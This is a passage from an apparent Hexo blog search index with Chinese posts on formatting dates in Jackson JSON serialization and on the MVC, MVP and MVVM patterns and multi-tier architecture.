id="处理默认时间对象类型"><a href="#处理默认时间对象类型" class="headerlink" title="处理默认时间对象类型"></a>处理默认时间对象类型</h2><p>Jackson默认Date date默认使用timestamps（时间戳：1970年01月01日00时00分00秒起至现在的总毫秒数）形式 。<br>自定义时间显示类型<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">@RequestMapping(<span class="string">"/json"</span>)</span><br><span class="line">public String json() throws JsonProcessingException &#123;</span><br><span class="line"></span><br><span class="line">   ObjectMapper mapper = new ObjectMapper();</span><br><span class="line"></span><br><span class="line">   //不使用时间戳的方式</span><br><span class="line">   mapper.configure(SerializationFeature.WRITE_DATES_AS_TIMESTAMPS, <span class="literal">false</span>);</span><br><span class="line">   //自定义日期格式对象</span><br><span class="line">   SimpleDateFormat sdf = new SimpleDateFormat(<span class="string">"yyyy-MM-dd HH:mm:ss"</span>);</span><br><span class="line">   //指定日期格式</span><br><span class="line">   mapper.setDateFormat(sdf);</span><br><span class="line"></span><br><span class="line">   Date date = new Date();</span><br><span class="line">   String str = mapper.writeValueAsString(date);</span><br><span class="line"></span><br><span class="line">   <span class="built_in">return</span> str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>面向对象封装、以及方法重载便于以后使用<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">public class JsonUtils &#123;</span><br><span class="line"></span><br><span class="line">    public static String getJson(Object object) throws JsonProcessingException &#123;</span><br><span class="line">        <span class="built_in">return</span> getJson(object,<span class="string">"yyyy-MM-dd HH:mm:ss"</span>);//默认时间显示形式</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    //第一个参数为时间对象，第二个参数为时间显示形式</span><br><span class="line">    public static String getJson(Object object, String dateFormat) throws JsonProcessingException &#123;</span><br><span class="line">        ObjectMapper mapper = new ObjectMapper();</span><br><span class="line">        mapper.configure(SerializationFeature.WRITE_DATE_KEYS_AS_TIMESTAMPS,<span class="literal">false</span>);</span><br><span class="line">        SimpleDateFormat simpleDateFormat = new SimpleDateFormat(dateFormat);</span><br><span class="line">        mapper.setDateFormat(simpleDateFormat);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">return</span> mapper.writeValueAsString(object);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>后续使用<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">@RequestMapping(<span class="string">"/json"</span>)</span><br><span class="line">public String json5() throws JsonProcessingException &#123;</span><br><span class="line">   Date date = new Date();</span><br><span class="line">   String json = JsonUtils.getJson(date);</span><br><span class="line">   <span class="built_in">return</span> json;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      <categories>
          
          <category> JSON </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JSON </tag>
            
            <tag> JSON时间对象 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MVC、MVP、MVVM架构模式与多层架构</title>
      <link href="/2019/07/21/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/"/>
      <url>/2019/07/21/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/</url>
      
        <content type="html"><![CDATA[<h2 id="架构模式"><a href="#架构模式" class="headerlink" title="架构模式"></a>架构模式</h2><h3 id="概要："><a href="#概要：" class="headerlink" title="概要："></a>概要：</h3><p>MVC、MVP、MVVM是传统较为主流的三种架构模式，使用架构模式的目的是为了解决界面呈现和逻辑代码分离问题，其中MVP和MVVM都是在MVC的基础上发展而来的，引发发展的主要原因在于各个模块间的耦合度、模块测试引发的问题。  </p><h3 id="MVC-："><a href="#MVC-：" class="headerlink" title="MVC ："></a>MVC ：</h3><p>MVC(全名：Model View Controller),正如名字一样MVC是使用Model、View、Controller三个模块设计创建 Web 应用程序的模式。<br>三个模块介绍及功能：<br>模型(Model):提供可视化元素的呈现、处理部分逻辑，包含数据和行为，可以认为是领域模型(domain)或JavaBean组件。通俗的讲就是用于网络请求、数据库、业务逻辑处理等操作并对应应用状态和业务功能的封装以及提供View模块显示的数据。如果对java熟悉的话Model模块最直观的部分就是JavaBean中的实体类和DAO类方法了。<br>视图（View）:数据的展示、提供用户数据显示及操作的可视化界面。（比如jsp页面）<br>控制器（Controller）:接受用户的输入指令并调用模型模块和视图模块去完成用户的需求。可以将控制器理解为模型模块和视图模块之间的桥梁，通过控制器管理两个模块的交互，是设计这类构架模式的基础分层目的的模块，一定程度上降低了耦合度、提高了代码重复利用率。<br><img src="/img/MVC.PNG" alt="MVC架构模式alt">  </p><h3 id="MVP"><a href="#MVP" class="headerlink" title="MVP :"></a>MVP :</h3><p>MVP(全名:Model-view-presenter),是MVC演变而来的一种软件设计模式。与MVC有一定的相似性：Presenter负责逻辑的处理，Model提供数据，View负责显示。但MVP与MVC有着一个重大的区别：在MVP中View并不直接使用Model，它们之间的通信是通过Presenter(MVC中的Controller)来进行的，所有的交互都发生在Presenter内部， 从理论上去除了View和Model的耦合。<br>模块介绍及功能：<br>Model：负责存储、检索、操纵数据，但与MVC的Model不同的是MVP的Model与可视化元素的呈现无关，与UI（view）处理逻辑也无关。<br>View：数据的展示、提供用户数据显示及操作的可视化界面，同时含有一个Presenter成员变量及逻辑接口<br>Presenter：处理与用户交互的负责逻辑。相比于MVC的controller，除了相同的事件触发控制功能，由于去除了View和Model的交互，所有的交互功能都发生在了Presenter（从Model传递需要呈现的可视化元素、View逻辑执行后发送响应等等）。由于解除了View与Model的耦合性，开发者可模拟测试View和Model中的任意一个模块，但明显的是Presenter接口与实现类的增加导致代码冗余度、复杂度会有明显增加。<br><img src="/img/MVP.PNG" alt="MVP架构模式alt">  </p><h3 id="MVVM"><a href="#MVVM" class="headerlink" title="MVVM :"></a>MVVM :</h3><p>MVVM(全名:Model View ViewModel)MVVM是MVP的进一步发展与规范，实现了View和Model的自动同步。MVVM模式中，一个ViewModel和一个View匹配绑定，所有View中的修改变化，都会自动更新到ViewModel中，同时ViewModel的任何变化也会自动同步到View上显示(ViewModel中的属性都实现了observable这样的接口，当使用属性 的set的方法，都会同时触发属性修改的事件，使绑定的View自动刷新，一般由不同的前端框架平台封装例如VUE。)，ViewModel和View之间的交互通过Data Binding完成， 而Data Binding可以实现双向的交互,这就使得视图和控制层之间的耦合程度进一步降低。<br>三个模块介绍及功能：<br>Model：负责存储、检索、操纵数据。<br>View：数据的展示、提供用户数据显示及操作的可视化界面，通过通过模板语法来声明在ViewModel模块完成数据绑定。<br>ViewModel：处理与用户交互的负责逻辑，核心是双向数据绑定，去除了View与Model的耦合关联，View可以独立于Model变化和修改方便测试，同时降低了代码的冗余度增加了重用度。<br><img src="/img/MVVM.PNG" alt="MVVM架构模式alt">  </p><h2 id="多层架构"><a href="#多层架构" class="headerlink" title="多层架构"></a>多层架构</h2><p>多层架构是开发人员在开发过程当中面对复杂且易变的需求采取的一种以隔离控制为主的应对策略，具体显示为将业务划分为多个层。  </p><h3 id="3层架构-3-tier-architecture"><a href="#3层架构-3-tier-architecture" class="headerlink" title="3层架构(3-tier architecture)"></a>3层架构(3-tier architecture)</h3><p>三层架构(3-tier architecture) 通常意义上的三层架构就是将整个业务应用划分为：界面层（User Interface layer）、业务逻辑层（Business Logic Layer）、 数据访问层（Data access layer）。<br>各层功能：<br>UI(界面层): 数据的展示、提供用户数据显示及操作的可视化界面。用于接收用户输入的数据和显示处理后用户需要的数据。<br>BLL:(业务逻辑层): UI层和DAL层之间的交互通道。对数据层的操作，对数据业务逻辑处理。<br>DAL:(数据访问层): 实现对数据的增、删、改、查。将存储在数据库中的数据提交给业务层，同时将业务层处理的数据保存到数据库。<br><img src="/img/3-tier-architecture.PNG" alt="三层架构alt"><br>大多数人三层架构易与架构模式混淆（尤其是MVC模式），从表示图可以直观看出它们间区别。架构模式（MVC）设计初衷是降低View与Model间的耦合度、降低代码冗余度、提高数据访问安全性。而三层架构是从整个业务应用出发，架构模式例如MVC只是三层架构中的UI（界面层）和BLL(业务逻辑层)展示。（很多博客文章表示MVC严格意义上 只是三层架构的UI界面层，MVC的Model模块实现了业务逻辑的处理和对数据层的操作）用图表示之间关系如下(下图表示基于B/S系统的三层架构，橙线表示对B/S系统的划分)。<br><img src="/img/emm.PNG" alt="三层架构alt">  </p><h3 id="2-2-多层架构-n-tier-architecture"><a href="#2-2-多层架构-n-tier-architecture" class="headerlink" title="2.2 多层架构(n-tier architecture)"></a>2.2 多层架构(n-tier architecture)</h3><p>简单的说多层架构是对三层架构的进一步划分，实际中有时“标准”的划分为三层架构会对维护调试带来很多麻烦，多层架构便是对三层架构中的UI（界面层）与BLL（业务逻辑层）进行进一步细分。</p><h2 id="java的三层架构"><a href="#java的三层架构" class="headerlink" title="java的三层架构"></a>java的三层架构</h2><p>也属于三层架构各个层的名字有所变化。<br>Struts（表示层）：Struts是一个表示层框架，主要作用是界面展示，接收请求，分发请求为用户提供一种交互式操作的界面。在MVC框架中，Struts属于VC层次，负责界面表现，负责MVC关系的分发。<br>Spring（业务层）：业务层框架，是一个整合的框架，能够很好地黏合表示层与持久层。<br>Hibernate（持久层）：持久层，有时候也称为是数据访问层，其功能主要是负责数据库的访问，可以访问数据库系统、二进制文件、文本文档或是XML文档。</p><p>学期末学习了MVC架构模式有感，也算完成了自己的第一篇博客，当作知识积累日志。<br>参考学习文章：<a href="https://www.runoob.com/w3cnote/three-tier-architecture.html" target="_blank" rel="noopener">https://www.runoob.com/w3cnote/three-tier-architecture.html</a><br>参考学习文章：<a href="https://www.jianshu.com/p/ebd2c5914d20" target="_blank" rel="noopener">https://www.jianshu.com/p/ebd2c5914d20</a></p>]]></content>
      
      
      <categories>
          
          <category> 架构模式 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MVC </tag>
            
            <tag> MVP </tag>
            
            <tag> MVVM </tag>
            
            <tag> 三层架构(3-tier application) </tag>
            
            <tag> 多层架构(n-tier application) </tag>
            
            <tag> 架构模式 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
